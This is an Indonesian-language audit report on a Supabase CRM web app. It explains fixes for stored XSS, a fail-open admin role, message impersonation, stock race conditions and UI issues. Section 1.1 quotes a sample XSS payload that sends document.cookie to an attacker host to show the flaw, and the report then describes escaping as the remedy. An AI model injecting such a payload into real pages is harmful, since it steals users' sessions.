# Laporan Audit — Dealstack CRM

Audit menyeluruh terhadap `index.html`, `script.js`, `style.css`, dan
`schema.sql`. Ditemukan 1 celah keamanan serius, beberapa bug logika, dan
sejumlah masalah desain yang akan menghambat performa saat data bertambah.

**Update dari revisi sebelumnya:** semua item yang sebelumnya ditandai ⚠️
"perlu tindak lanjut" (sisa titik XSS, dan race condition counter stok)
**sudah diperbaiki** pada revisi ini. Lihat bagian 1.1 dan 2.1.

---

## 1. Bug & celah keamanan yang sudah diperbaiki ✅

### 1.1 Stored XSS — teks pengguna disisipkan mentah lewat `innerHTML`
**Paling kritis.** Di 90+ tempat, `script.js` menyisipkan data dari database
langsung ke `innerHTML` tanpa disaring — nama pelanggan, alamat, catatan
tim, judul/deskripsi tugas, nama produk, nama vendor, dsb. Karena field-field
ini diisi bebas oleh pengguna, siapa pun yang bisa menulis data bisa
memasukkan HTML/JavaScript berbahaya, misalnya:

```
<img src=x onerror="fetch('https://attacker.com/steal?c='+document.cookie)">
```

Begitu pengguna lain membuka halaman yang menampilkan data tersebut, kode itu
**ikut dieksekusi di browser mereka** — bisa mencuri sesi login, mengubah
data, atau menyamar sebagai pengguna itu.

**Sudah diperbaiki — sekarang tuntas di seluruh aplikasi:** ditambahkan
fungsi `esc()` (HTML-escape) di `script.js` dan diterapkan secara sistematis
ke seluruh titik yang menampilkan teks bebas dari pengguna, termasuk:
- Tabel Pelanggan, Proyek, Tugas, Stock & Gudang, Riwayat Stok Masuk/Keluar
- Papan Pesan (nama pengirim & isi pesan)
- Log Aktivitas, Notifikasi, Kalender & Agenda
- Panel Pencarian Global, seluruh dropdown pemilihan (pelanggan/proyek/
  anggota tim/gudang), avatar (atribut `src`/`alt`), tabel Kelola Pengguna

Untuk log **Aktivitas**, yang sengaja memakai tag `<b>` supaya nama tampil
tebal (mis. "Pelanggan **Acme** dihapus"), dibuat fungsi kedua `escB()`: ia
meng-escape semua HTML seperti `esc()`, lalu HANYA mengembalikan tag polos
`<b>` dan `</b>` (tanpa atribut apa pun) ke bentuk aslinya. Variasi apa pun
dengan atribut (mis. `<b onmouseover=...>`) tetap ter-escape sebagai teks
biasa — jadi format tebal tetap tampil tanpa membuka kembali celah XSS.

Sudah diverifikasi tidak ada sisa pola `${objek.field}` (nama, judul, isi,
catatan, alamat, dst.) yang belum dibungkus `esc()`/`escB()`, dan tidak ada
kasus escape ganda (`esc(esc(...))`) yang akan merusak tampilan karakter
seperti kutip atau simbol &.

### 1.2 Fail-open ke peran Admin saat gagal memuat profil ✅
Di `masukKeAplikasi()`, jika pengambilan baris `profil` gagal (migrasi belum
jalan, koneksi terputus, dsb.), kode lama **menjadikan pengguna sebagai
`admin`** secara default. Akibatnya, dalam kondisi error apa pun, pengguna
biasa bisa melihat menu khusus Admin (Kelola Pengguna, Pengawasan Tim,
tombol Hapus). Hak penghapusan data tetap ditahan oleh RLS di database, tapi
tampilan UI-nya menyesatkan dan berpotensi disalahgunakan.

**Diperbaiki:** default sekarang `'anggota'` (hak paling rendah), sesuai
prinsip *fail-safe defaults*.

### 1.3 Penyamaran identitas di papan Pesan ✅
Form Pesan sebelumnya punya field "Nama Anda" bebas diketik (nilai
default-nya bahkan hardcode "Lawrence Austin"), padahal aplikasi sudah punya
login sungguhan. Siapa pun yang login bisa mengirim pesan mengaku sebagai
orang lain, termasuk Admin.

**Diperbaiki:** nama pengirim selalu diambil dari akun yang sedang login
(`CURRENT_USER.nama`); field teks bebasnya dihapus dari form.

### 1.4 Validasi "stok tidak boleh negatif" hanya di JavaScript ✅
README menyebut sistem "menolak" perubahan yang membuat sisa stok negatif,
tapi pengecekan ini murni di sisi klien — bisa dilewati lewat panggilan API
langsung, atau lolos karena race condition dua pengguna mencatat stok keluar
nyaris bersamaan.

**Diperbaiki:** ditambahkan trigger database (`TAMBAHAN v13` di
`schema.sql`) yang menghitung ulang total stok masuk/keluar per item setiap
ada baris riwayat baru, dan menolak transaksi yang membuat sisa stok
negatif — tidak bisa dilewati dari luar aplikasi.

### 1.5 Indeks database yang hilang ✅
Kolom foreign key yang sering dipakai untuk filter (`tugas.ditugaskan_ke`,
`tugas.ditugaskan_oleh`, `aktivitas.pelaku_id`, `proyek.dibuat_oleh_id`,
`riwayat_stok.pelanggan_id`, `riwayat_stok.proyek_id`) belum punya indeks,
sehingga query akan makin lambat seiring data bertambah (full table scan).

**Diperbaiki:** indeks ditambahkan lewat `TAMBAHAN v13`.

---

## 2. Masalah desain/arsitektur

### 2.1 Race condition pada counter stok — sudah diperbaiki ✅
Sebelumnya setiap pencatatan stok masuk/keluar melibatkan dua penulisan
terpisah dari browser: (1) insert ke `riwayat_stok`, lalu (2) update
`stok_item` berdasarkan total yang dihitung di JavaScript dari data yang
sudah dimuat sebelumnya. Ini bukan satu transaksi atom, sehingga:
- jika penulisan kedua gagal (koneksi putus di tengah), kedua tabel jadi
  tidak sinkron;
- jika dua pengguna mencatat stok pada produk yang sama nyaris bersamaan,
  salah satu update bisa **menimpa** update yang lain (lost update).

**Diperbaiki:** ditambahkan trigger database (`TAMBAHAN v14` di
`schema.sql`) yang berjalan otomatis setiap `riwayat_stok` berubah
(tambah/edit/hapus), menghitung ULANG `stok_masuk` dan `stok_keluar`
langsung dari `SUM(riwayat_stok)` untuk item terkait, dan menulisnya ke
`stok_item` dalam satu transaksi atom di server. Efeknya:
- Kartu stok **tidak mungkin lagi** tidak sinkron dengan riwayatnya, berapa
  pun banyak pengguna yang mencatat stok bersamaan.
- `script.js` tidak perlu diubah — update yang masih dikirimnya dari klien
  jadi tidak berbahaya karena langsung ditimpa ulang dengan angka yang benar
  oleh trigger.
- Migrasi ini juga menjalankan sinkronisasi sekali di akhir untuk
  memperbaiki data lama yang mungkin sudah terlanjur drift.

### 2.2 Semua data dimuat sekaligus saat login, tanpa paginasi ⚠️
`muatSemuaData()` menarik seluruh baris tabel `pelanggan`, `proyek`,
`tugas`, `profil`, `gudang`, `stok_item`, dan `riwayat_stok` setiap kali
aplikasi dibuka (kecuali `aktivitas` yang dibatasi 80 baris). Untuk CRM kecil
ini tidak masalah, tapi begitu data mencapai ribuan baris (terutama
`riwayat_stok`, yang terus bertambah sebagai log transaksi), waktu muat awal
akan makin lambat dan konsumsi bandwidth/kuota Supabase makin besar.

**Rekomendasi:** tambahkan `.limit()`/paginasi pada tabel yang berpotensi
besar (Proyek, Riwayat Stok, Aktivitas); pertimbangkan paginasi sisi-server
(`.range()`) begitu jumlah baris melebihi beberapa ratus. Ini perubahan
arsitektur yang lebih besar — sebaiknya didiskusikan dulu perkiraan skala
data 1–2 tahun ke depan supaya solusinya (limit sederhana vs paginasi penuh)
sesuai kebutuhan.

### 2.3 Kunci Supabase `anon key` ditulis langsung di `config.js`
Bukan bug — sesuai desain Supabase (anon key memang untuk sisi klien,
keamanan diatur lewat RLS). Catatan proses yang tetap berlaku: pastikan
setiap tabel baru yang ditambahkan di masa depan juga diaktifkan RLS-nya —
tabel baru di Supabase secara default terbuka kalau RLS lupa diaktifkan.
`service_role key` tidak boleh pernah ditaruh di file yang di-commit ke repo
publik.

### 2.4 Tidak ada mekanisme retry/backoff untuk kegagalan jaringan
Sebagian besar pemanggilan Supabase hanya menampilkan toast error sekali
tanpa retry. Bukan bug kritis, tapi UX yang bisa ditingkatkan — misalnya
tombol "Coba lagi" pada toast error.

---

### 2.5 Sidebar ikut men-scroll bersama halaman ✅
Sebelumnya `.sidebar` hanya diberi `min-height:100vh` tanpa batas atas dan
tanpa area scroll sendiri. Begitu jumlah menu bertambah (mis. menu
"Pengawasan Tim" & "Kelola Pengguna" yang khusus tampil untuk Admin), tinggi
sidebar bisa melebihi tinggi layar — akibatnya sidebar ikut memanjang dan
scroll bersama seluruh halaman, bukan sebagai panel yang berdiri sendiri.

**Diperbaiki:** tinggi `.sidebar` sekarang dikunci ke tinggi layar
(`height:100vh`), dan menu-menu dibungkus dalam `.sidebar-nav` (elemen baru
di `index.html`) yang punya `overflow-y:auto` sendiri dengan scrollbar tipis
senada tema — hanya daftar menu itu yang bisa di-scroll, sementara logo di
bagian atas tetap diam dan halaman/konten utama sama sekali tidak
terpengaruh oleh panjangnya daftar menu. Perilaku drawer di layar mobile
(`position:fixed`, buka/tutup lewat tombol ☰) tidak berubah dan tetap
kompatibel dengan struktur baru ini.

---

## 3. Ringkasan status

| # | Temuan | Dampak | Status |
|---|--------|--------|--------|
| 1.1 | Stored XSS via innerHTML | Tinggi — pencurian sesi/data | ✅ Tuntas di seluruh aplikasi |
| 1.2 | Fail-open ke peran Admin | Sedang — UI menyesatkan | ✅ Diperbaiki |
| 1.3 | Penyamaran identitas di Pesan | Sedang — integritas data | ✅ Diperbaiki |
| 1.4 | Validasi stok hanya di JS | Sedang — integritas data | ✅ Diperbaiki (trigger DB, v13) |
| 1.5 | Indeks database hilang | Rendah saat ini, naik seiring data | ✅ Diperbaiki (v13) |
| 2.1 | Race condition counter stok | Sedang — data stok bisa salah | ✅ Diperbaiki (trigger DB, v14) |
| 2.2 | Tanpa paginasi | Rendah saat ini, naik seiring data | ⚠️ Rekomendasi — butuh diskusi skala |
| 2.3 | Pengingat RLS tabel baru | — | ⚠️ Catatan proses, bukan bug |
| 2.4 | Tanpa retry jaringan | Rendah — UX | ⚠️ Rekomendasi |
| 2.5 | Sidebar ikut scroll dengan halaman | Rendah — UX/tata letak | ✅ Diperbaiki |

## 4. Langkah selanjutnya

1. Jalankan blok **`TAMBAHAN v13`** lalu **`TAMBAHAN v14`** di
   `schema.sql`, berurutan, lewat SQL Editor Supabase — keduanya aman
   dijalankan berulang dan tidak menghapus data.
2. Deploy ulang `index.html` + `script.js` yang sudah diperbaiki (lewat
   `git push` seperti biasa, Vercel akan otomatis build ulang).
3. Setelah deploy, coba isi salah satu field teks bebas (mis. nama
   pelanggan) dengan `<b>test</b>` untuk memverifikasi bahwa tag tersebut
   sekarang tampil sebagai teks biasa, bukan diproses sebagai HTML.
4. Item 2.2 (paginasi) dan 2.4 (retry) adalah peningkatan, bukan bug —
   beri tahu saya kapan pun Anda ingin melanjutkan ke situ.
